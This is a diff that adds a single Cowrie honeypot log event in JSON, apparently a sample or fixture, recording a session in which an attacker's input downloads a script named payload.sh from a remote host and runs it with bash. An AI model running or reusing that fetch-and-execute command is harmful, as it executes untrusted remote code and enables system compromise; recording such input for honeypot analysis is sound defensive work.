@@ -1,0 +1,11 @@
+{
+  "eventid": "cowrie.command.input",
+  "timestamp": "2026-09-06T00:11:00.000000Z",
+  "session": "sess_cowrie_901",
+  "src_ip": "198.51.100.42",
+  "src_port": 49152,
+  "dst_ip": "172.28.0.10",
+  "dst_port": 2222,
+  "input": "curl -O http://cdn.io/payload.sh && bash payload.sh",
+  "sensor": "cowrie-node-1"
+}
